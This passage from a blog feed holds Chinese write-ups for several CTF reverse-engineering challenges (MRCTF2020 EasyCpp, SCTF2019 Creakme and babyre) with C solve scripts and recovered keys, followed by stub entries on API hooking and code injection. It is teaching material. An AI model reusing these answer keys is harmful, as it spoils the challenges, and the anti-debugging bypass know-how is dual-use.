{</span><br><span class="line"><span class="number">0xCA3E0C86</span>, <span class="number">0x19AED798</span>, <span class="number">0xA66B77E2</span>, <span class="number">0xB077A16A</span>, <span class="number">0x05379169</span>, <span class="number">0x307BF97A</span>, <span class="number">0x104B5A43</span>, <span class="number">0x28D47D86</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">final</span>[<span class="number">8</span>] = {</span><br><span class="line"><span class="number">0xF80F37B3</span>, <span class="number">0x5DAEBCBC</span>, <span class="number">0x864D5ABA</span>, <span class="number">0xD3629744</span>, <span class="number">0x1624BA4F</span>, <span class="number">0x1A729F0B</span>, <span class="number">0x266D6865</span>, <span class="number">0x67C86BBA</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> k[] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">final</span>[i] ^= data[i];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">0</span>];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">1</span>];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">2</span>];</span><br><span class="line">k[j++] = ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">3</span>];</span><br><span class="line">}</span><br><span class="line">k[j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"SWPU_2019_CTF"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">{</span><br><span class="line">k[i] ^= key[i % <span class="number">13</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, k[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="MRCTF2020-EasyCpp"><a class="header-anchor" href="#MRCTF2020-EasyCpp">¶</a>[MRCTF2020]EasyCpp</h1><h2 id="考点-v4"><a class="header-anchor" href="#考点-v4">¶</a>考点</h2><p>异或、替换，素因数分解</p><h2 id="分析-v4"><a class="header-anchor" href="#分析-v4">¶</a>分析</h2><p>一些关键的都已经标识出来了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331362066.png" alt=""></p><h3 id="读取输入"><a class="header-anchor" href="#读取输入">¶</a>读取输入</h3><p>读取9次key，并且拼接起来</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331630377.png" alt=""></p><h3 id="异或-v2"><a class="header-anchor" href="#异或-v2">¶</a>异或</h3><p>这里面是和1异或</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331969448.png" alt=""></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331929652.png" alt=""></p><h3 id="素因数分解"><a class="header-anchor" href="#素因数分解">¶</a>素因数分解</h3><p>这里只要能整除i，就重新进入递归，参数为整除i后的数，如果i遍历完不符合，结束循环，然后拼接上空格</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332066496.png" alt=""></p><h3 id="替换"><a class="header-anchor" href="#替换">¶</a>替换</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332316391.png" alt=""></p><p>将数字换成字母，空格换为=</p><h3 id="比较"><a class="header-anchor" href="#比较">¶</a>比较</h3><p>红框数组存储的是最后比较的字符串</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332398066.png" alt=""></p><h2 id="脚本-v4"><a class="header-anchor" href="#脚本-v4">¶</a>脚本</h2><p>这里我直接手动替换算出来的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">293</span> * <span class="number">8</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">1223</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">11</span> * <span class="number">7</span> * <span class="number">5</span> * <span class="number">5</span> * <span class="number">3</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">2477</span>) ^ <span class="number">1</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">125</span> * <span class="number">27</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">3</span> * <span class="number">3011</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">13</span> * <span class="number">7</span> * <span class="number">27</span>) ^ <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="number">353</span> * <span class="number">5</span> * <span class="number">2</span>) ^ <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure><p>md5即可</p><h1 id="SCTF2019-Creakme"><a class="header-anchor" href="#SCTF2019-Creakme">¶</a>SCTF2019-Creakme</h1><h2 id="考点-v5"><a class="header-anchor" href="#考点-v5">¶</a>考点</h2><p>AES-CBC加密、Base64加密、反调试、SMC</p><h2 id="分析-v5"><a class="header-anchor" href="#分析-v5">¶</a>分析</h2><h3 id="反调试、SMC"><a class="header-anchor" href="#反调试、SMC">¶</a>反调试、SMC</h3><p>一看到这种遍历段名称的操作，熟悉SMC自解密的应该知道这是敏感的操作，也就是解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335524731.png" alt=""></p><p>对于这种在输入开始前的反调试，采用attach to process</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335425994.png" alt="反调试"></p><p>可以看到如果不是调试状态，就将数据强制转为函数指针</p><p>这里已经解密完并执行完程序了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335630803.png" alt=""></p><p>对其交叉引用可以看到</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335692377.png" alt=""></p><h3 id="AES-CBC、Base64加密"><a class="header-anchor" href="#AES-CBC、Base64加密">¶</a>AES-CBC、Base64加密</h3><p>动调发现这就是加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336067526.png" alt=""></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336317921.png" alt="AES-CBC"></p><p>可以知道该函数就是初始化密钥</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336575248.png" alt=""></p><p>从这里的明文异或结合CBC可以知道是CBC模式</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337171206.png" alt="明文异或"></p><p>key和iv分别为sycloversyclover、sctfsctfsctfsctf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336622490.png" alt="iv"></p><p>这里很多this指针，但是我们还是可以通过一些特征以及FindCrypt发现这是AES中的key的初始化</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336696808.png" alt=""></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336732282.png" alt="轮常量异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336808010.png" alt="S表替换"></p><p>AES-CBC加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337454010.png" alt="明文与iv向量的异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337280514.png" alt="内部加密"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336891802.png" alt="base64"></p><p>进入该函数中，明显是base64加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336933402.png" alt=""></p><p>找到码表，发现没有被改过</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336989928.png" alt=""></p><h3 id="比较-v2"><a class="header-anchor" href="#比较-v2">¶</a>比较</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337016203.png" alt=""></p><h2 id="解密"><a class="header-anchor" href="#解密">¶</a>解密</h2><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337028435.png" alt=""></p><h1 id="SCTF2019-babyre"><a class="header-anchor" href="#SCTF2019-babyre">¶</a>SCTF2019-babyre</h1><h2 id="考点-v6"><a class="header-anchor" href="#考点-v6">¶</a>考点</h2><p>base64解密、Maze、移位与异或、花指令</p><h2 id="分析-v6"><a class="header-anchor" href="#分析-v6">¶</a>分析</h2><p>花指令就不说了，全部都是一样的，去除即可</p><p>迷宫也没啥说的，注意这里是三维迷宫 <strong>ddwwxxssxaxwwaasasyywwdd</strong></p><h3 id="base64解密"><a class="header-anchor" href="#base64解密">¶</a>base64解密</h3><p>可以看到这里先将我们的输入去table找索引，然后&amp;0x3F取出最后的六位，按位与上v5左移6，这样就得到了8位的字符，加上=4的判断，类似于base64的解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650339409043.png" alt=""></p><p>直接将最后的字符串加密即可<strong>c2N0Zl85MTAy</strong></p><h3 id="换位异或"><a class="header-anchor" href="#换位异或">¶</a>换位异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340193709.png" alt=""></p><p>加密流程：每四个输入存入int型的变量，然后进行xor_enc加密，将前四个字符加密后存放到第四个字符的后一个字符，依次往后。</p><blockquote><p><strong>之所以要这样进行移位是因为如果强制转为int型，由于小端序，存储的时候是12345678，这样int取出的时候就变成了4321</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340446709.png" alt="xor_enc"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340461185.png" alt=""></p><p>xor_enc加密流程：将第二第三第四个字符进行异或，分为四个字节去table找到对应的值，然后重新组合成int型，再经过一系列左移右移异或操作并返回，再将返回值与第一个字符异或，这样就得到了一个加密后的结果，这里要一直等到index&lt;=29，也就是前四个字符不会加密</p><p>我们可以看到这里v10只有26，那么26、27、28、29下标的v10就赋值给了v11、v12、v13、v14</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340936262.png" alt=""></p><p>取出最后四个int型存储的十六个字节，存储到enc_flag数组，然后比较</p><blockquote><p><strong>假设int a=0x12345678,那么HIBYTE(a)=0x12,BYTE2(a)=0x34,BYTE1(a)=0x56</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340991543.png" alt=""></p><p>这样我们就知道了最后的四个int型的元素，往前推，29是怎么来的呢，是flag[25]<sup>enc(flag[26],flag[27],flag[28])得到的，所以flag[29]</sup>enc(flag[26],flag[27],flag[28])即可得到flag[25]，前面的元素同理</p><h2 id="脚本-v5"><a class="header-anchor" href="#脚本-v5">¶</a>脚本</h2><p>因为涉及了ida的左右移位操作，而ida目录下defs.h有定义，所以可以直接引用</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"defs.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v3[<span class="number">273</span>] = {</span><br><span class="line">    <span class="number">0x000000D6</span>, <span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x000000FE</span>, <span class="number">0x000000CC</span>, <span class="number">0x000000E1</span>, <span class="number">0x0000003D</span>, <span class="number">0x000000B7</span>,</span><br><span class="line">    <span class="number">0x00000016</span>, <span class="number">0x000000B6</span>, <span class="number">0x00000014</span>, <span class="number">0x000000C2</span>, <span class="number">0x00000028</span>, <span class="number">0x000000FB</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x0000002B</span>, <span class="number">0x00000067</span>, <span class="number">0x0000009A</span>, <span class="number">0x00000076</span>, <span class="number">0x0000002A</span>, <span class="number">0x000000BE</span>, <span class="number">0x00000004</span>, <span class="number">0x000000C3</span>,</span><br><span class="line">    <span class="number">0x000000AA</span>, <span class="number">0x00000044</span>, <span class="number">0x00000013</span>, <span class="number">0x00000026</span>, <span class="number">0x00000049</span>, <span class="number">0x00000086</span>, <span class="number">0x00000006</span>, <span class="number">0x00000099</span>,</span><br><span class="line">    <span class="number">0x0000009C</span>, <span class="number">0x00000042</span>, <span class="number">0x00000050</span>, <span class="number">0x000000F4</span>, <span class="number">0x00000091</span>, <span class="number">0x000000EF</span>, <span class="number">0x00000098</span>, <span class="number">0x0000007A</span>,</span><br><span class="line">    <span class="number">0x00000033</span>, <span class="number">0x00000054</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000043</span>, <span class="number">0x000000ED</span>, <span class="number">0x000000CF</span>, <span class="number">0x000000AC</span>, <span class="number">0x00000062</span>,</span><br><span class="line">    <span class="number">0x000000E4</span>, <span class="number">0x000000B3</span>, <span class="number">0x0000001C</span>, <span class="number">0x000000A9</span>, <span class="number">0x000000C9</span>, <span class="number">0x00000008</span>, <span class="number">0x000000E8</span>, <span class="number">0x00000095</span>,</span><br><span class="line">    <span class="number">0x00000080</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000094</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000075</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000003F</span>, <span class="number">0x000000A6</span>,</span><br><span class="line">    <span class="number">0x00000047</span>, <span class="number">0x00000007</span>, <span class="number">0x000000A7</span>, <span class="number">0x000000FC</span>, <span class="number">0x000000F3</span>, <span class="number">0x00000073</span>, <span class="number">0x00000017</span>, <span class="number">0x000000BA</span>,</span><br><span class="line">    <span class="number">0x00000083</span>, <span class="number">0x00000059</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000019</span>, <span class="number">0x000000E6</span>, <span class="number">0x00000085</span>, <span class="number">0x0000004F</span>, <span class="number">0x000000A8</span>,</span><br><span class="line">    <span class="number">0x00000068</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000081</span>, <span class="number">0x000000B2</span>, <span class="number">0x00000071</span>, <span class="number">0x00000064</span>, <span class="number">0x000000DA</span>, <span class="number">0x0000008B</span>,</span><br><span class="line">    <span class="number">0x000000F8</span>, <span class="number">0x000000EB</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000004B</span>, <span class="number">0x00000070</span>, <span class="number">0x00000056</span>, <span class="number">0x0000009D</span>, <span class="number">0x00000035</span>,</span><br><span class="line">    <span class="number">0x0000001E</span>, <span class="number">0x00000024</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000063</span>, <span class="number">0x00000058</span>, <span class="number">0x000000D1</span>, <span class="number">0x000000A2</span>,</span><br><span class="line">    <span class="number">0x00000025</span>, <span class="number">0x00000022</span>, <span class="number">0x0000007C</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000021</span>, <span class="number">0x00000078</span>, <span class="number">0x00000087</span>,</span><br><span class="line">    <span class="number">0x000000D4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000057</span>, <span class="number">0x0000009F</span>, <span class="number">0x000000D3</span>, <span class="number">0x00000027</span>, <span class="number">0x00000052</span>,</span><br><span class="line">    <span class="number">0x0000004C</span>, <span class="number">0x00000036</span>, <span class="number">0x00000002</span>, <span class="number">0x000000E7</span>, <span class="number">0x000000A0</span>, <span class="number">0x000000C4</span>, <span class="number">0x000000C8</span>, <span class="number">0x0000009E</span>,</span><br><span class="line">    <span class="number">0x000000EA</span>, <span class="number">0x000000BF</span>, <span class="number">0x0000008A</span>, <span class="number">0x000000D2</span>, <span class="number">0x00000040</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000038</span>, <span class="number">0x000000B5</span>,</span><br><span class="line">    <span class="number">0x000000A3</span>, <span class="number">0x000000F7</span>, <span class="number">0x000000F2</span>, <span class="number">0x000000CE</span>, <span class="number">0x000000F9</span>, <span class="number">0x00000061</span>, <span class="number">0x00000015</span>, <span class="number">0x000000A1</span>,</span><br><span class="line">    <span class="number">0x000000E0</span>, <span class="number">0x000000AE</span>, <span class="number">0x0000005D</span>, <span class="number">0x000000A4</span>, <span class="number">0x0000009B</span>, <span class="number">0x00000034</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000055</span>,</span><br><span class="line">    <span class="number">0x000000AD</span>, <span class="number">0x00000093</span>, <span class="number">0x00000032</span>, <span class="number">0x00000030</span>, <span class="number">0x000000F5</span>, <span class="number">0x0000008C</span>, <span class="number">0x000000B1</span>, <span class="number">0x000000E3</span>,</span><br><span class="line">    <span class="number">0x0000001D</span>, <span class="number">0x000000F6</span>, <span class="number">0x000000E2</span>, <span class="number">0x0000002E</span>, <span class="number">0x00000082</span>, <span class="number">0x00000066</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000060</span>,</span><br><span class="line">    <span class="number">0x000000C0</span>, <span class="number">0x00000029</span>, <span class="number">0x00000023</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000053</span>, <span class="number">0x0000004E</span>, <span class="number">0x0000006F</span>,</span><br><span class="line">    <span class="number">0x000000D5</span>, <span class="number">0x000000DB</span>, <span class="number">0x00000037</span>, <span class="number">0x00000045</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000FD</span>, <span class="number">0x0000008E</span>, <span class="number">0x0000002F</span>,</span><br><span class="line">    <span class="number">0x00000003</span>, <span class="number">0x000000FF</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000072</span>, <span class="number">0x0000006D</span>, <span class="number">0x0000006C</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000051</span>,</span><br><span class="line">    <span class="number">0x0000008D</span>, <span class="number">0x0000001B</span>, <span class="number">0x000000AF</span>, <span class="number">0x00000092</span>, <span class="number">0x000000BB</span>, <span class="number">0x000000DD</span>, <span class="number">0x000000BC</span>, <span class="number">0x0000007F</span>,</span><br><span class="line">    <span class="number">0x00000011</span>, <span class="number">0x000000D9</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000041</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000010</span>, <span class="number">0x0000005A</span>, <span class="number">0x000000D8</span>,</span><br><span class="line">    <span class="number">0x0000000A</span>, <span class="number">0x000000C1</span>, <span class="number">0x00000031</span>, <span class="number">0x00000088</span>, <span class="number">0x000000A5</span>, <span class="number">0x000000CD</span>, <span class="number">0x0000007B</span>, <span class="number">0x000000BD</span>,</span><br><span class="line">    <span class="number">0x0000002D</span>, <span class="number">0x00000074</span>, <span class="number">0x000000D0</span>, <span class="number">0x00000012</span>, <span class="number">0x000000B8</span>, <span class="number">0x000000E5</span>, <span class="number">0x000000B4</span>, <span class="number">0x000000B0</span>,</span><br><span class="line">    <span class="number">0x00000089</span>, <span class="number">0x00000069</span>, <span class="number">0x00000097</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000096</span>, <span class="number">0x00000077</span>, <span class="number">0x0000007E</span>,</span><br><span class="line">    <span class="number">0x00000065</span>, <span class="number">0x000000B9</span>, <span class="number">0x000000F1</span>, <span class="number">0x00000009</span>, <span class="number">0x000000C5</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000C6</span>, <span class="number">0x00000084</span>,</span><br><span class="line">    <span class="number">0x00000018</span>, <span class="number">0x000000F0</span>, <span class="number">0x0000007D</span>, <span class="number">0x000000EC</span>, <span class="number">0x0000003A</span>, <span class="number">0x000000DC</span>, <span class="number">0x0000004D</span>, <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0x00000079</span>, <span class="number">0x000000EE</span>, <span class="number">0x0000005F</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000CB</span>, <span class="number">0x00000039</span>, <span class="number">0x00000048</span>,</span><br><span class="line">    <span class="number">0x000000C6</span>, <span class="number">0x000000BA</span>, <span class="number">0x000000B1</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000050</span>, <span class="number">0x00000033</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000056</span>,</span><br><span class="line">    <span class="number">0x00000097</span>, <span class="number">0x00000091</span>, <span class="number">0x0000007D</span>, <span class="number">0x00000067</span>, <span class="number">0x000000DC</span>, <span class="number">0x00000022</span>, <span class="number">0x00000070</span>, <span class="number">0x000000B2</span>,</span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> xor_final)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> v2 = (v3[BYTE2(xor_final)] &lt;&lt; <span class="number">16</span>) | v3[(<span class="keyword">unsigned</span> __int8)xor_final] | (v3[BYTE1(xor_final)] &lt;&lt; <span class="number">8</span>) | (v3[HIBYTE(xor_final)] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    <span class="keyword">return</span> __ROL4__(v2, <span class="number">12</span>) ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(__ROL4__(v2, <span class="number">8</span>) ^ __ROR4__(v2, <span class="number">2</span>)) ^ __ROR4__(v2, <span class="number">6</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> v10[<span class="number">30</span>] = { <span class="number">0</span> };</span><br><span class="line">    v10[<span class="number">26</span>] = <span class="number">0xBE040680</span>;</span><br><span class="line">    v10[<span class="number">27</span>] = <span class="number">0xC5AF7647</span>;</span><br><span class="line">    v10[<span class="number">28</span>] = <span class="number">0x9FCC401F</span>;</span><br><span class="line">    v10[<span class="number">29</span>] = <span class="number">0xD8BF92EF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">    {</span><br><span class="line">        v10[i] = v10[i + <span class="number">4</span>] ^ encode(v10[i + <span class="number">1</span>]^v10[i + <span class="number">2</span>]^v10[i + <span class="number">3</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">0</span>], ((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">1</span>], ((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">2</span>], ((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">3</span>]);</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650342054912.png" alt=""></p><p>这样子就不会存在int型读取时小端序的问题</p><h1 id=""><a class="header-anchor" href="#">¶</a></h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;Buuctf刷题记录&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Detours学习</title>
    <link href="https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/"/>
    <id>https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-15T07:26:14.000Z</published>
    <updated>2022-04-24T01:37:54.871Z</updated>
    
    <content type="html"><![CDATA[<p>Detourd学习</p><span id="more"></span> <h1 id="0x00-参考"><a class="header-anchor" href="#0x00-参考">¶</a>0x00-参考</h1><p><a href="https://blog.csdn.net/jyl_sh/article/details/120855998">https://blog.csdn.net/jyl_sh/article/details/120855998</a></p><p><a href="https://blog.csdn.net/z971130192/article/details/100565010">https://blog.csdn.net/z971130192/article/details/100565010</a></p><p><a href="https://blog.csdn.net/z971130192/article/details/100565398">https://blog.csdn.net/z971130192/article/details/100565398</a></p><p><a href="https://blog.csdn.net/z971130192/article/details/100671576">https://blog.csdn.net/z971130192/article/details/100671576</a></p>]]></content>
    
    
    <summary type="html">Detours</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>API钩取技术</title>
    <link href="https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/"/>
    <id>https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-15T06:28:13.000Z</published>
    <updated>2022-04-20T01:21:38.511Z</updated>
    
    
    <summary type="html">API钩取技术</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>使用汇编语言编写注入代码</title>
    <link href="https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/"/>
    <id>https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/</id>
    <published>2022-04-14T08:03:09.000Z</published>
    <updated>2022-04-20T05:39:42.656Z</updated>
    
